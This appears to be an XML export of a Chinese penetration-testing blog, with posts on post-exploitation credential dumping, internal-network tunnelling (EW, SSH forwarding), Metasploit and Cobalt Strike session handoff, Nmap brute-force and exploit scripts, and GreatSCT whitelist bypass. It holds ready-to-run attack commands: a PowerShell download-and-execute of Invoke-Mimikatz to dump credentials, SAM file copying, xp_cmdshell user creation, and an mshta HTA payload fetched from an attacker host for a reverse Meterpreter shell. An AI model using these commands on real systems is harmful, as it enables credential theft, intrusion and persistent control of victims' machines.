    <title><![CDATA[一键抓取目标机器上的所有明文密码]]></title>
    <url>%2Farchives%2F46eda2dd.html</url>
    <content type="text"><![CDATA[几乎支持市面上大部分常用工具,另外,脚本自身基于py,跨平台性相对较好,免杀效果也还不错,不过,实战中务必要在一个较高权限[最好是提权后的root或system]下运行,否则你很可能什么都抓不到,实战中用过几次,主要是想用它来搜集内网机器上的各种密码,但,并不是特别靠谱,有些行为还是很容易被杀软捕捉到,自己如果不会免杀,就很头疼了,更多详情大家可自行参考其github, https://github.com/AlessandroZ/LaZagne 话说回来,作为学习样本还是很不错的]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>信息收集</category>
        <category>密码抓取</category>
      </categories>
      <tags>
        <tag>抓取密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基础命令使用[win篇]]]></title>
    <url>%2Farchives%2F94014dc0.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
      <tags>
        <tag>基础命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对CobaltStrikeDNS隧道的理解与实战]]></title>
    <url>%2Farchives%2Fe66ca3f3.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>神兵利器</category>
        <category>Cobalt Strike</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用Ew轻松穿透目标多级内网(思维导图待整理)]]></title>
    <url>%2Farchives%2Fa585a37c.html</url>
    <content type="text"><![CDATA[该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran） ew 快速穿透目标多级内网: 简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网 假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131 win2008 假设为目标内网数据库服务器,可正常访问公网 假设其内网ip为 192.168.32.170 win7 假设为自己公网的vps 假设其公网ip为 192.168.3.232 centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网 假设其内网ip为 192.168.32.169 0x02 首先,利用ew做最简单的正向代理,其实就是大家最常用的所谓的ss: 在 win2008R2 机器上执行 ew_for_Win.exe -s ssocksd -l 1080 在win7上打开Proxifier根据上面监听的端口建立正常的socks代理即可 一层反向穿透(处于内网可访问公网的情况) 假设目标机器就直接处在内网[没有公网ip,但可以访问公网],我们也可以利用ew进行反向socks5代理,然后直接在vps上就可以很方便的访问目标内网中的所有机器了: 先在 win7上执行,等待目标反弹连接 # ew_for_Win.exe -s rcsocks -l 1080 -e 1234在 win2008上执行,反弹socks5连接 # ew_for_Win.exe -s rssocks -d 192.168.3.232 -e 1234复杂内网多层穿透(A(内网)-&gt;B(内网)-&gt;C(公网)) 实现复杂内网环境下的跨网段多级穿透: 第一种场景(内网机器不能访问公网) 内网机器不能访问公网,可通过能访问公网的机器把内网不能访问公网机器带出来,比较简单,如下: 假设win2008处在目标内网且不能访问公网但可以访问内网中的资源 而win2008R2这台机器上虽然有内网ip,但不能访问内网资源,好在win2008R2可以访问win2008 这时我们想获取内网资源就可以这样干,先在win2008上开启socks代理服务,然后再在DMZ的 win2008R2连上内网的win2008的socks服务 最后,通过win2008上的socks服务我们就可以轻松访问目标内网中的各种资源了,具体实现过程如 下 首先,在win2008上执行,意思就是在本地建立socks5代理,端口为1080 # ew_for_Win.exe -s ssocksd -l 1080在到DMZ的win2008R2上执行,意思就是把来自外部的1090端口的流量转到内网192.168.32.170这台机器的1080端口上 # ew_for_Win.exe -s lcx_tran -l 1090 -f 192.168.32.170 -g 1080最后,再回到win7[vps]上去利用Proxifier建立正常的socks代理访问1090端口即可,访问vps的1090就相当于访问内网win2008的1080端口 第二种场景(还是有些机器不能访问公网的情况)假设win2008在内网且能访问公网但不能访问内网资源,而centos 5.1能访问内网资源但却无法访问公网,而win2008可以访问centos 5.1 这时,我们要想获取内网资源,就可以通过win2008在centos 5.1和win7[vps]之间建立一条socks5 通道,实现过程比较简单,如下首先,在win7[实际中的vps]上执行,把来自外部的1080端口的流量转到本地的1379端口上 # ew_for_Win.exe -s lcx_listen -l 1080 -e 1379此时回到centos 5.1上执行,在本地启动socks5代理并监听2345端口 # chmod +x ew_for_Linux32 # ./ew_for_Linux32 -s ssocksd -l 2345然后再到win2008上去执行,意思就是把win7[vps]的1379端口和centos 5.1的2345进行绑定,即建立socks5通道 # ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1379 -f 192.168.32.169 -g 2345最后,在回到win7[vps]建立正常的socks代理访问即可,实际上就相当于访问win7的1080就相当于访问centos 5.1的2345端口,通过这种方式一样也可以把整个目标内网代理出来 第三种场景(多级内网轻松穿透) 假设win2008R2在内网[无公网ip]并在一个独立的内网段,win2008也处在目标内网,假设在另一个内网段,centos 5.1同样也处在内网,可又在另一个单独的内网段 且win2008R2能访问win2008,win2008能访问centos 5.1,而centos 5.1能访问目标核心网,要实现层层穿透,访问到核心网资源,我们就可以这样 先在win7[vps]上执行,把来自外部的1080端口流量转到本地的1235端口上 # ew_for_Win.exe -s rcsocks -l 1080 -e 1235在win2008R2上执行,把win7[vps]的1235端口和内网win2008的3456端口绑定 # ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1235 -f 192.168.32.170 -g 3456在win2008上执行,将来自外部的1236端口和本地的3456端口进行绑定 # ew_for_Win.exe -s lcx_listen -l 3456 -e 1236在centos 5.1上执行,将本地的socks连接反弹到win2008的1236端口上,此时再回到win2008上看会提示”rssocks cmd_socket OK!”,说明通道已经建立成功 # ./ew_for_Linux32 -s rssocks -d 192.168.32.170 -e 1236最后,再回到win7[vps]上利用Proxifier访问本地的1080就相当于访问centos 5.1的1236端口,即可轻松获取核心网的数据 一点小结: 关于ew,想必经常搞内网的朋友,都已经非常熟练了,这里也就不废话了,其实,关于ew本身在实战中还是比较实用的,在此也非常感谢作者的无私贡献,真心希望国内能多一些这样的人,总体来讲,在工具使用上并没有太多技术含量,关键还是要你自己根据目标的实际内网环境仔细弄清楚数据流向再针对性的用,上面一些简单应用场景中,表面看着貌似挺复杂的,其实真正理解以后,都非常简单,深刻搞清楚这些最基本的东西你才有可能灵活应用,什么都是如此,总是停留在’用’别人的工具上,自己没有一点儿的独立分析和想法,是很难有长进的,后续有空会再简单介绍下关于Termite跳板机使用 引用及整理来自: https://klionsec.github.io/2017/08/05/ew-tunnel/]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>内网通道</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ssh转发流量的四种姿势]]></title>
    <url>%2Farchives%2Ff69de167.html</url>
    <content type="text"><![CDATA[在很多时候拿到了内网的一台主机，我们需要用它做跳板来对内网进一步扩大战果。 也许方法很多，meterpreter，nc等等。但是最方便也最有可能穿透防火墙的方法，就是用ssh。 分为四种类型：本地转发，远程转发，跳板转发，动态转发。本地转发 假设攻击机A主机为本机，ip是y.y.y.y,用户是hacker，被攻击且用作跳板的主机是B，ip是x.x.x.x，对应的内网ip是10.0.0.2，用户是root，ssh的端口是22。假设B机器上的80端口开放了一个服务，但是只有B主机本机上才能访问，这时候可以使用本地转发，在A机器上执行命令： ssh -L 8080:localhost:80 root@x.x.x.x 这样，在本机A中访问localhost:80,数据被转发到B主机的80端口，即实现了访问B机器的本地服务。 远程转发 很常见的一个实例就是攻击者拿下了某目标内部的网关服务器，但是出于安全考虑网管的web控制台界面只有在网关服务器自身上才能访问，这时候就可以通过这种方式转发流量，方便的操作网关服务器的web控制台了。 上面的情况，是基于A主机可以ssh到B的情况，但假如从A到B的ssh连接被拒绝，而恰好B主机的防火墙没有禁止其使用ssh外连，这时候就可以通过远程转发来实现上述同样的效果。在B机器上执行命令： ssh -R 8080:localhost80 hacker@y.y.y.y 这时候在A机器上访问自身的8080端口，数据也是被转发到了B主机的80端口上的。可见，这种方式受到的局限比较多，因为如果能够在B主机上使用ssh外连了，还需要通过ssh来转发流量的情况也是很少见的，但也不是没有。 跳板转发 以上两种转发，都是只对跳板服务器自身的服务，很多时候，渗透需要的是内网中一台稳定的跳板，这时候就可以使用跳板转发来实现多主机之间转发。假设现在需要通过B主机作为跳板，来访问与B处于同一内网中的机器C的80端口，假设C的ip是10.0.0.3,这时候可以在攻击机上执行如下命令： ssh -g -L 8080:10.0.0.3:80 root@x.x.x.x 此时在A主机上8080端口的流量就被转发到C主机的80端口上了。 动态转发最有用的就是最后要介绍的 动态转发，这种转发可以将流量随心所欲的转发，此时实现的效果就相当于代理服务器，在A机器上用下面的命令实现： ssh -D 8080 root@x.x.x.x 此时在A机器上配置SOCKS代理端口localhost:8080,就可以以B为代理服务器随心所欲的畅游。最后补充使用ssh进行X转发的命令，其实很简单： ssh -X root@x.x.x.x 这样连接上以后，目标机器的X服务器所做的操作都会通过x协议发送到本地，很方便的实现了可视化操作。例如在终端输入firefox，就可以在本地弹出一个实际上运行在远程的firefox进程。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>内网通道</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网渗透后门(一)：backdoor-factory]]></title>
    <url>%2Farchives%2F8833018e.html</url>
    <content type="text"><![CDATA[前提：拿下一台机器之后，需要持续控制，可以种一个后门 kali里边有一款强大的工具——backdoor-factory，github地址： 该软件的原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jmp到代码段，来触发payload。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>权限维持</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windows下hash抓取的几种方式]]></title>
    <url>%2Farchives%2Fa9f133be.html</url>
    <content type="text"><![CDATA[前提：在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为： C:\Windows\System32\config\SAM 各种工具： mimikatz wce wce.exe QuarkPwDump powershell脚本powershell脚本:使用powersploit中的mimikatz.ps1mimikatz在线加载：powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz -Dumpcreds&quot;本地加载：powershell -exec bypass &quot;import-module Invoke-Mimikatz.ps1;Invoke-Mimikatz -Dumpcreds&quot;Ninja-copy在线加载：powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip/Invoke-NinjaCopy.ps1&apos;);Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination C:\SAM.txt;&quot;本地加载：powershell -exec bypass &quot;Import-Module .\Invoke-NinjaCopy.ps1;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive&quot; 后记：为防止防火墙，杀软等工具杀掉ps1脚本，推荐使用在线加载的方式，文件不落地。]]></content>
  </entry>
  <entry>
    <title><![CDATA[msf+cobaltstrike联动(二)：把cs中的机器spwan给msf]]></title>
    <url>%2Farchives%2Fa90e2e0e.html</url>
    <content type="text"><![CDATA[前提：CS已经获取到session，可以进入图形化管理机器，现在需要使用msf进行进一步渗透，需要msf的metepreter。 开启msf msf设置监听msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set lhost 192.168.3.117 lhost =&gt; 192.168.3.117 msf exploit(handler) &gt; set lport 2222 lport =&gt;2222 msf exploit(handler) &gt; exploit 在CS上开启监听，设置payload为windows/foreign/reverse_tcp host为msf的host port为msf的监听端口 在控制机器上右键选择Spawn 选择Spwan之后会需要选择一个监听，选择刚创建的msf的监听 可以看到msf已经接收到cs上spwan过来的session]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>神兵利器</category>
      </categories>
      <tags>
        <tag>神兵利器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf+cobaltstrike联动(一)：把msf的session发给cobaltstrike]]></title>
    <url>%2Farchives%2Fc2c552f3.html</url>
    <content type="text"><![CDATA[前提：MFS已经获取到session，可以进入metepreter，现在需要使用cobaltstrike进行图形化管理或团队协作。 cobaltstrike起一个beacon监听 如使用：windows/beacon_http/reverse_http 设置好host和port之后启动监听。 MSF中使用use exploit/windows/local/payload_inject msf exploit(payload_inject) &gt; set payload windows/meterpreter/reverse_http msf exploit(payload_inject) &gt; set DisablePayloadHandler true msf exploit(payload_inject) &gt; set LHOST 192.168.3.117 msf exploit(payload_inject) &gt; set LPORT 10001 msf exploit(payload_inject) &gt; set SESSION 1 注：set DisablePayloadHandler true 作用是msf不监听，代表是用来返给其他监听的 都设置好后 msf exploit(payload_inject) &gt; run 去CS端查看结果 cs成功接收到msf中的session]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>神兵利器</category>
      </categories>
      <tags>
        <tag>神兵利器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web渗透测试Fuzz字典分享]]></title>
    <url>%2Farchives%2Fa98fb3b0.html</url>
    <content type="text"><![CDATA[Web渗透测试Fuzz字典分类参数Fuzz字典 Xss Fuzz字典 用户名字典 密码字典 目录字典 sql-fuzz字典 ssrf-fuzz字典XXE字典参数Fuzz字典https://github.com/TheKingOfDuck/fuzzDicts/blob/master/paramDict/parameter.txt 采集自ThinkPHP,yii2,phphub,Zblog,DiscuzX,WordPress等常见PHP框架/CMSXss Fuzz字典https://github.com/TheKingOfDuck/easyXssPayload/blob/master/easyXssPayload.txt 采集自github用户名字典https://github.com/TheKingOfDuck/fuzzDicts/tree/master/userNameDict密码字典https://github.com/TheKingOfDuck/fuzzDicts/tree/master/passwordDict目录字典https://github.com/TheKingOfDuck/fuzzDicts/tree/master/directoryDictsSQL Fuzz字典https://github.com/TheKingOfDuck/fuzzDicts/blob/master/sqlDict/sql.txtssrf fuzz字典https://github.com/TheKingOfDuck/fuzzDicts/blob/master/ssrfDicts 由xebxfe师傅提供。 https://github.com/doge-dogXXE字典https://github.com/TheKingOfDuck/fuzzDicts/tree/master/XXEDictsWeb收集自百度。 ctf字典https://github.com/TheKingOfDuck/fuzzDicts/tree/master/ctfDictApi字典https://github.com/TheKingOfDuck/fuzzDicts/tree/master/apiDict/api.txt路由器后台字典https://github.com/TheKingOfDuck/fuzzDicts/tree/master/routerDicts/pass.txt 联想:网络设备的默认密码(交换机、路由器、安全设备)) 文件后缀Fuzzhttps://github.com/TheKingOfDuck/fuzzDicts/tree/master/uploadFileExtDicts 采集自https://github.com/c0ny1/upload-fuzz-dic-builderjs文件字典采集自:https://github.com/7dog7/bottleneckOsmosis 钟馗采集的代码写得很cxk 我真弟弟。。。 Github项目地址： https://github.com/TheKingOfDuck/fuzzDicts]]></content>
  </entry>
  <entry>
    <title><![CDATA[Nmap_进阶使用[脚本篇]]]></title>
    <url>%2Farchives%2Fb0bdc71c.html</url>
    <content type="text"><![CDATA[前言 在这篇文章中，我们将研究最著名的渗透工具之一 Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能，几乎适用于任何渗透场景。不少人甚至认为它就是全球最好的扫描软件。除了常规的网络扫描，Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大量渗透工作，这种脚本是基于Lua编程语言，有点像javascript。正是NSE，使得Nmap不再普通。 nmap -sV -sT -Pn --open -v 192.168.3.23当然,你也可以用下面的脚本先尝试获取下目标机器更详细的服务banner信息[不过这个并不详细,有时候简单telnet下就直接能看到详细的banner了,用不着nmap],看具体版本的原因是因为有些服务工具漏洞只能利用在特定的版本上,所以,提前知道大概一下还是非常有必要的,废话到此为止,咱们开始真正的内容 nmap -sT -Pn --open -v banner.nse 192.168.3.23和ftp相关的一些漏洞检测脚本ftp-anon.nse检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,比如你想快速批量抓一些ftp nmap -p 21 --script ftp-anon.nse -v 192.168.3.23ftp-brute.nseftp爆破脚本[默认只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个速度可能还会更慢),毕竟,是直接在公网爆破] nmap -p 21 --script ftp-brute.nse -v 192.168.3.23ftp-vuln-cve2010-4221.nseProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出 nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23ftp-proftpd-backdoor.nseProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令 nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23ftp-vsftpd-backdoor.nseVSFTPD v2.3.4 跟Proftp同样的问题,被人捅进去以后在代码里面插了后门 nmap -p 21 --script ftp-vsftpd-backdoor.nse -v 192.168.3.23和ssh 相关的一些扫描脚本sshv1.nse大家都知道的,sshv1是可以被中间人的 nmap -p 22 --script sshv1.nse -v 192.168.3.23和smtp,pop3,imap相关的一些扫描脚本 smtp-brute.nse 爆破smtp弱口令简单爆破smtp弱口令,拿这个爆进去的邮箱给人发信也许成功率会稍微高一点 nmap -p 25 --script smtp-brute.nse -v 192.168.3.23 smtp-enum-users.nse 枚举目标smtp服务器枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行,搜集一些必要的信息还是蛮好的 nmap -p 25 --script smtp-enum-users.nse -v 192.168.3.23 smtp-vuln-cve2010-4344.nse string_vformat函数中存在堆溢出Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出 nmap -p 25 --script smtp-vuln-cve2010-4344.nse -v 192.168.3.23 smtp-vuln-cve2011-1720.nse Postfix 溢出 Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出 nmap -p 25 --script smtp-vuln-cve2011-1720.nse -v 192.168.3.23 smtp-vuln-cve2011-1764.nse Exim字符串漏洞Exim dkim_exim_verify_finish() 存在格式字符串漏洞,太老现在基本很难遇到了 nmap -p 25 --script smtp-vuln-cve2011-1764.nse -v 192.168.3.23 pop3-brute.nse pop简单弱口令爆破nmap -p 110 --script pop3-brute.nse -v 192.168.3.23 imap-brute.nse imap简单弱口令爆破nmap -p 143,993 --script imap-brute.nse -v 192.168.3.23和dns 相关的一些漏洞扫描脚本 dns-zone-transfer.nse 域传送漏洞 检查目标ns服务器是否允许传送,如果能,直接把子域拖出来就好了 nmap -p 53 --script dns-zone-transfer.nse -v 192.168.3.23 nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=target.org -v 192.168.3.23旁站查询 hostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉 nmap -p80 --script hostmap-ip2hosts.nse 192.168.3.23和各种数据库相关的一些扫描脚本informix爆破脚本 informix-brute.nse informix爆破脚本 nmap -p 9088 --script informix-brute.nse 192.168.3.23mysql 扫描root空密码 mysql-empty-password.nse mysql 扫描root空密码,比如你想批量抓mysql nmap -p 3306 --script mysql-empty-password.nse -v 192.168.3.23mysql root弱口令简单爆破 mysql-brute.nse mysql root弱口令简单爆破 nmap -p 3306 --script mysql-brute.nse -v 192.168.3.23导出mysql中所有用户的hash mysql-dump-hashes.nse 导出mysql中所有用户的hash nmap -p 3306 --script mysql-dump-hashes --script-args=&apos;username=root,password=root&apos; 192.168.3.23Mysql身份认证漏洞 mysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高] nmap -p 3306 --script mysql-vuln-cve2012-2122.nse -v 192.168.3.23扫描C段mssqlnmap -p 445 --script ms-sql-info.nse -v 203.124.11.0/24 ms-sql-info.nse 扫描C段mssql扫描mssql sa空密码nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port=1433 -v 192.168.3.0/24 ms-sql-empty-password.nse 扫描mssql sa空密码,比如你想批量抓mssql nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24sa弱口令爆破nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24利用xp_cmdshell,远程执行系统命令nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add 192.168.3.0/24导出mssql中所有的数据库用户及密码hashnmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24爆破postgresqlnmap -p 5432 --script pgsql-brute -v 192.168.3.0/24爆破oraclenmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL -v 192.168.3.0/24 nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v 192.168.3.0/24爆破mongdbnmap -p 27017 --script mongodb-brute 192.168.3.0/24 nmap -p 6379 --script redis-brute.nse 192.168.3.0/24和snmp相关的一些扫描脚本,用来搜集些内网信息还行,运气好也许还能查到账号密码什么的爆破C段的snmpnmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb=user.txt 192.168.3.0/24和telnet相关的一些扫描脚本简单爆破telnetnmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24和ldap服务相关的一些利用脚本简单爆破ldapnmap -p 389 --script ldap-brute --script-args ldap.base=&apos;cn=users,dc=cqure,dc=net&apos; 192.168.3.0/24和各类web中间件,web集成环境相关的一些利用脚本xmpp爆破nmap -p 5222 --script xmpp-brute.nse 192.168.3.0/24短文件扫描nmap -p80 --script http-iis-short-name-brute.nse 192.168.3.0/24iis 5.0 6.0 webadv写nmap --script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24bash远程执行nmap -sV -p- --script http-shellshock --script-args uri=cgi-binbin,cmd=ls 192.168.3.0/24探测目标svnnmap --script http-svn-info 192.168.3.0/24其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来nmap -p80 -sV --script http-wordpress-brute --script-args &apos;userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true&apos; 192.168.3.0/24扫描目标网站备份nmap -p80 --script=http-backup-finder 192.168.3.0/24iis6.0远程代码执行nmap -sV --script http-vuln-cve --script-args uri=&apos;anotheruri&apos; 192.168.3.0/24跟vpn相关的一些利用脚本识别目标pptp版本暂时只看到一个pptp暂时还好使,其实pptp也是可以爆破的,嘿嘿……不过,实际目标中,pptp几乎没有,openvpn偏多,想直接捅目标内网,这无疑是很不错的入口 nmap -p 1723 --script pptp-version.nse 192.168.3.0/24smb漏洞检测脚本集smb-vuln-ms08-067.nse smb-vuln-ms10-054.nse smb-vuln-ms10-061.nse smb-vuln-ms17-010.nse smb远程执行 nmap -p445 --script smb-vuln-ms17-010.nse 192.168.3.0/24检测内网嗅探实际测试中,貌似并没什么卵用 nmap -sn -Pn --script sniffer-detect.nse 192.168.3.0/24其它的一些辅助性脚本其实有些实际用途可能并不大,大家选择性的用极好了 爆破目标的rsyncnmap -p 873 --script rsync-brute --script-args &apos;rsync-brute.module=www&apos; 192.168.3.0/24爆破目标的rloginnmap -p 513 --script rlogin-brute 192.168.3.0/24爆破目标的vncnmap --script vnc-brute -p 5900 192.168.3.0/24爆破pcanywherenmap -p 5631 --script=pcanywhere-brute 192.168.3.0/24爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧nmap --script nessus-brute -p 1241 192.168.3.0/24爆破nexposenmap --script nexpose-brute -p 3780 192.168.3.0/24shodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,配合着一起用,这个威力还是不可小觑的,不过在即实际测的时候貌似还有些问题 nmap --script shodan-api --script-args &apos;shodan-api.target=192.168.3.0/24,shodan-api.apikey=SHODANAPIKEY&apos;尝试利用nmap一句话对目标C段进行常规漏洞扫描实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描 nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24尝试利用nmap一句话对目标进行C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率 nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.3.0/24后话: 由于nmap内置丰富的漏洞扫描脚本,也使得nmap的能力在一定程度得到了极大的扩展,意味者我们完全可以自己按照nmap事先规定好的语法来模仿实现一些简单的定制扫描,这也是让我感觉nmap做的非常好的一点,极大的可扩展性,比如,你自己握有0day的时候,想自动化干点儿什么事儿,嘿嘿……具体就不多说了,相信大家都懂,^_^,没错,masscan,zmap这种基于无状态的扫描确实快的吓人,而且shodan api也是个很不错的选择,但对定制脚本支持始终还是差了点,时间关系只挑了一些可能用到的脚本,今天就简单聊到这儿吧,工具没有没有好坏,虽然实战中不一定都能用上,关键还是大家在实际渗透过程中能灵活变通就好,话说回来,这一切的前提都是建立在别人让你扫的基础之上的,nmap的标志实在是太招摇过市了,nmap所支持的那几种扫描类型,估计早已被各种ids所免疫,说实话,有些目标可能都没什么机会让你扫,关于nmap其它的一些用法,后期遇到相对比较实用的会不定期再更新上来,大家如果有兴趣,也可以直接去参考官方,那里说的还是非常详细的,起码比我这个要详细很多,有任何问题请直接私信我参考:https://www.freebuf.com/column/149716.html]]></content>
      <categories>
        <category>渗透测试</category>
        <category>工具篇</category>
        <category>nmap</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[GreatSct_Win应用程序白名单bypass工具]]></title>
    <url>%2Farchives%2F840507ec.html</url>
    <content type="text"><![CDATA[GreatSCT简介 GreatSCT目前得到了@ConsciousHacker的支持，该项目名为Great SCT（Great Scott）。Great SCT是一个用于生成应用程序白名单绕过的开源项目。此工具适用于红队和蓝队。它是一种用来生成Metasploit payload的工具，可绕过常见的防病毒解决方案和应用程序白名单解决方案。 您可以从这里下载： https://github.com/GreatSCT/GreatSCT安装和使用 首先必须下载并安装它才能开始使用Great SCT。运行以下命令从github下载Great SCT，并在安装时注意其依赖工具。 这有助于通过使用以下工具绕过Applocker策略： Installutil.exe： 安装程序工具是一个命令行工具，允许您通过运行安装程序组件来安装和卸载特定程序集中的服务器资源。 Msbuild.exe： Microsoft Build Engine是一个用于构建应用程序的平台。这个引擎，也称为MSBuild。 Mshta.exe： Mshta.exe运行Microsoft HTML应用程序，Windows OS实用程序负责运行HTA（HTML应用程序）文件。我们可以运行JavaScript或Visual的HTML文件。 Regasm.exe：程序集注册工具读取程序集内的元数据，并将必要的记录添加到注册表中，，从而允许COM客户端透明地创建.NET框架类。 Regsvcs.exe： RegSvcs表示Microsoft .NET远程注册表服务，它以.NET服务安装著称。 Regsvr32.exe： Regsvr32是一个命令行实用程序，用于在Windows注册表中注册和取消注册OLE控件，例如DLL和ActiveX控件。 git clone https://github.com/GreatSCT/GreatSCT.git cd GreatSCT cd setup ./setup.sh下载后，输入以下命令以获取帮助： use Bypass 现在获取exploit列表类型：list 生成恶意的hta文件现在，从有payload列表中，您可以选择任何目标进行所需的攻击。但对于这次攻击，我们将使用： use mshta/shellcode_inject/base64_migrate.py 执行命令后，输入以下命令： generate 执行generate命令后，它会询问您要使用哪种方法。因为我们将使用MSFvenom类型1来选择第一个选项。 单击enter for meterpreter。然后分别提供lhost和lport，即192.168.1.107和4321。 在生成shellcode时，它将要求您为payload提供一个名称。默认情况下，它将以payload作为名称。因为我不想输入任何名字，所以只需按Enter键。 现在，创建了两个文件。一个资源文件和另一个hta文件。 首先，在/usr/share/greatsct output/source中通过输入以下命令启动python的服务器： python -m SimpleHTTPServer 80 现在在受害者PC的命令提示符中执行hta文件 mshta.exe http://192.168.1.107/payload.hta 使用资源文件启动multi/handler。为此，请输入以下命令： msfconsole -r 